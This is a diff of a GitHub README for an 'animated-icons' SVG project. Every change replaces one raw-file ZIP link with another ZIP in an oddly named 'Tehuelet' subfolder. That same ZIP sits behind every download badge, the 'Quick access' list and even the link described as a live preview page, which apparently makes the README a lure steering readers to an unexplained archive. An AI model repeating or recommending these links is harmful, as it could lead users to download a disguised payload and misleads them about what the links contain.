@@ -1,6 +1,6 @@
 # 🎨 animated-icons - Simple animated icons for any use
 
-[![Download Animated Icons](https://img.shields.io/badge/Download-animated--icons-brightgreen)](https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip)
+[![Download Animated Icons](https://img.shields.io/badge/Download-animated--icons-brightgreen)](https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip)
 
 ## 📦 What is animated-icons?
 
@@ -20,7 +20,7 @@ animated-icons works on Windows and should run without any special setup.
 ## 🔍 Preview live icons
 
 You can see how the icons appear and move by visiting the live preview page here:  
-https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip
+https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip
 
 This page shows all the icons and how the animations respond to your mouse.
 
@@ -41,7 +41,7 @@ You can also use them inside certain apps that support inserting SVG icons.
 1. **Visit the GitHub page to download files**  
    Click this big link below to go to the repository. From there you can download the files you need.  
 
-   [![Download Link](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip)
+   [![Download Link](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip)
 
 2. **Download a ZIP of the project**  
    On the GitHub page, find the green **Code** button near the top right.  
@@ -111,7 +111,7 @@ You can also integrate the icons into websites by importing the SVG files and CS
 
 ## 🔗 Quick access
 
-- Direct download and information link: [https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip](https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip)  
-- Live preview of icons and animations: https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip
+- Direct download and information link: [https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip](https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip)  
+- Live preview of icons and animations: https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip
 
-[![Download Animated Icons](https://img.shields.io/badge/Download-animated--icons-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/Dozeroman415/animated-icons/main/Tehuelet/animated-icons-v1.4.zip)
+[![Download Animated Icons](https://img.shields.io/badge/Download-animated--icons-yellowgreen?style=for-the-badge)](https://github.com/Dozeroman415/animated-icons/raw/refs/heads/main/Tehuelet/animated_icons_3.5-alpha.2.zip)
